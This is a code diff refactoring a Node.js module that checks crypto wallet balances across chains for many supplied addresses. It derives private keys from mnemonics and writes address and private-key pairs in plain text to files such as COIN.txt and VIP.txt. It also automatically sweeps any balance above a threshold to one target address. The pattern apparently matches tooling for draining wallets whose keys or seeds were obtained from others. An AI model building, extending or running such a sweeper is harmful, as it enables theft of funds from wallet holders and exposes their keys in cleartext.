@@ -8,10 +8,102 @@ const SendCoinManager = require('./sendCoin.service');
 const logger = require('../utils/logger');
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+const OUTPUT_DIR = process.cwd();
 
-/**
- * Run balance check across multiple chains and tokens
- */
+// --- File helpers ---
+
+function appendFile(filename, content) {
+  return fs.appendFile(path.join(OUTPUT_DIR, filename), content);
+}
+
+function formatCoinLine(explorerUrl, address, privateKey, amount, token) {
+  return `${explorerUrl}/address/${address} : ${privateKey} : ${amount} ${token}\n`;
+}
+
+// --- Private key export for mnemonic wallets ---
+
+async function ensurePrivateKey(wallet) {
+  if (!wallet.privateKey && wallet.mnemonic) {
+    const keyring = new HdKeyring({ mnemonic: wallet.mnemonic, numberOfAccounts: 5 });
+    wallet.privateKey = await keyring.exportAccount(wallet.address);
+  }
+}
+
+// --- Sweep logic ---
+
+async function trySweep(web3, wallet, targetAddress, value, gasPrice, gasLimit, coinLine) {
+  const fee = BigInt(gasPrice) * BigInt(gasLimit);
+  if (BigInt(value) <= fee) return;
+
+  try {
+    const manager = new SendCoinManager(web3);
+    const txHash = await manager.sendWithGas(wallet.privateKey, targetAddress, gasPrice, gasLimit);
+    if (txHash) {
+      wallet.balances[wallet.balances.length - 1].txHash = txHash;
+      logger.info({ address: wallet.address, txHash }, 'Funds swept');
+    }
+  } catch (err) {
+    logger.error({ address: wallet.address, err }, 'Sweep error');
+  }
+
+  await appendFile('VIP.txt', coinLine);
+  await sleep(1000);
+}
+
+// --- Balance checking ---
+
+async function checkTokenBalances({ web3, contract, wallets, token, tokenAddress, chainName, chainConfig, targetAddress }) {
+  const gasLimit = chainConfig.gasLimit || 21000n;
+  let gasPrice = null;
+  let addressList = wallets.map((w) => w.address);
+
+  while (addressList.length > 0) {
+    const batch = addressList.splice(0, chainConfig.batchSize);
+
+    try {
+      const data = await contract.methods.balances(batch, tokenAddress).call();
+      let coinText = '';
+      let addressText = '';
+
+      for (const [i, value] of data.entries()) {
+        const address = batch[i];
+        const wallet = wallets.find((w) => w.address === address);
+        if (!wallet) continue;
+
+        const amount = web3.utils.fromWei(value, 'ether');
+        wallet.balances.push({ chain: chainName, token, balance: amount });
+
+        // Skip zero balances
+        if (value === '0' || value === 0n) continue;
+
+        await ensurePrivateKey(wallet);
+
+        const coinLine = formatCoinLine(chainConfig.explorerUrl, address, wallet.privateKey, amount, token);
+        coinText += coinLine;
+        addressText += `${address}:${wallet.privateKey}\n`;
+
+        // Sweep if above threshold
+        if (targetAddress && parseFloat(amount) > SCAN_DEFAULTS.balanceThreshold) {
+          if (!gasPrice) {
+            gasPrice = chainConfig.fixedGasPrice || await web3.eth.getGasPrice();
+            logger.info({ chainName, gasPrice: gasPrice.toString(), gasLimit: gasLimit.toString() }, 'Gas info');
+          }
+          await trySweep(web3, wallet, targetAddress, value, gasPrice, gasLimit, coinLine);
+        }
+      }
+
+      if (coinText) await appendFile('COIN.txt', coinText);
+      if (addressText) await appendFile('address-coin.txt', addressText);
+    } catch (error) {
+      logger.error({ chainName, token, err: error }, 'Error checking balances batch');
+    }
+
+    await sleep(500);
+  }
+}
+
+// --- Main entry ---
+
 async function run(apiKey, addresses, tokens, chains, targetAddress) {
   for (const chainName of chains) {
     const chainConfig = CHAIN_CONFIG[chainName];
@@ -28,129 +120,27 @@ async function run(apiKey, addresses, tokens, chains, targetAddress) {
         from: contractAddress
       });
 
-      // Check each token separately (matching reference logic)
       for (const token of tokens) {
-        const tokenAddr = tokenAddresses[token];
-        // tokenAddress array with single token for contract call
-        const tokenAddressArray = [
-          (!tokenAddr || token === 'NATIVE')
+        const addr = tokenAddresses[token];
+        const tokenAddress = [
+          (!addr || token === 'NATIVE')
             ? '0x0000000000000000000000000000000000000000'
-            : tokenAddr
+            : addr
         ];
 
-        await check({
-          name: chainName,
-          arr: addresses,
-          maxPerTime: chainConfig.batchSize,
-          web3,
-          contract,
-          explorerUrl: chainConfig.explorerUrl,
-          coin: token,
-          tokenAddress: tokenAddressArray,
-          targetAddress,
-          gasLimit: chainConfig.gasLimit,
-          chainConfig
+        await checkTokenBalances({
+          web3, contract, wallets: addresses,
+          token, tokenAddress, chainName, chainConfig, targetAddress
         });
       }
+
+      logger.info({ chainName }, 'Chain scan complete');
     } catch (error) {
       logger.error({ chainName, err: error }, 'Error processing chain');
     }
   }
+
   return addresses;
-}
-
-/**
- * Check balances - one token at a time, matching reference logic exactly
- * data[i] maps directly to addressArray[i]
- */
-async function check({ name, arr, maxPerTime, web3, contract, explorerUrl, coin, tokenAddress, targetAddress, gasLimit, chainConfig }) {
-  if (!gasLimit) {
-    gasLimit = 21000n;
-  }
-
-  try {
-    let gasPrice = null;
-    let arrA = arr.map((e) => e.address);
-
-    while (arrA.length !== 0) {
-      const arr2 = arrA.splice(0, maxPerTime);
-      try {
-        const data = await contract.methods.balances(arr2, tokenAddress).call();
-
-        let textTemp = '';
-        let textTemp2 = '';
-
-        for (const [i, value] of data.entries()) {
-          const address = arr2[i];
-          const item = arr.find((e) => e.address === address);
-
-          // Always push balance info (including zero)
-          if (item) {
-            const amount = web3.utils.fromWei(value, 'ether');
-            item.balances.push({
-              chain: name,
-              token: coin,
-              balance: amount // keep full precision from fromWei
-            });
-
-            if (value !== '0' && value !== 0n) {
-              // Export private key for mnemonic wallets
-              if (!item.privateKey && item.mnemonic) {
-                const keyring = new HdKeyring({
-                  mnemonic: item.mnemonic,
-                  numberOfAccounts: 5,
-                });
-                item.privateKey = await keyring.exportAccount(address);
-              }
-
-              const text = `${explorerUrl}/address/${address} : ${item.privateKey} : ${amount} ${coin}`;
-              const text2 = `${address}:${item.privateKey}`;
-              textTemp += text + '\n';
-              textTemp2 += text2 + '\n';
-
-              if (targetAddress && parseFloat(amount) > SCAN_DEFAULTS.balanceThreshold) {
-                if (!gasPrice) {
-                  gasPrice = chainConfig.fixedGasPrice || await web3.eth.getGasPrice();
-                  logger.info({ name, gasPrice: gasPrice.toString(), gasLimit: gasLimit.toString() }, 'Gas info');
-                }
-
-                const fee = BigInt(gasPrice) * BigInt(gasLimit);
-                if (BigInt(value) > fee) {
-                  try {
-                    const manager = new SendCoinManager(web3);
-                    const txHash = await manager.sendWithGas(
-                      item.privateKey,
-                      targetAddress,
-                      gasPrice,
-                      gasLimit
-                    );
-                    if (txHash) {
-                      item.balances[item.balances.length - 1].txHash = txHash;
-                      logger.info({ address, txHash, amount }, 'Funds swept');
-                    }
-                  } catch (err) {
-                    logger.error({ address, err }, 'Sweep error');
-                  }
-                  await fs.appendFile(path.join(process.cwd(), 'VIP.txt'), `${text}\n`);
-                  await sleep(1000);
-                }
-              }
-            }
-          }
-        }
-
-        if (textTemp) await fs.appendFile(path.join(process.cwd(), 'COIN.txt'), textTemp);
-        if (textTemp2) await fs.appendFile(path.join(process.cwd(), 'address-coin.txt'), textTemp2);
-      } catch (error) {
-        logger.error({ name, err: error }, 'Error checking balances batch');
-      }
-      await sleep(500);
-    }
-  } catch (error) {
-    logger.error({ name, err: error }, 'Error in check');
-    return false;
-  }
-  return true;
 }
 
 module.exports = { run };
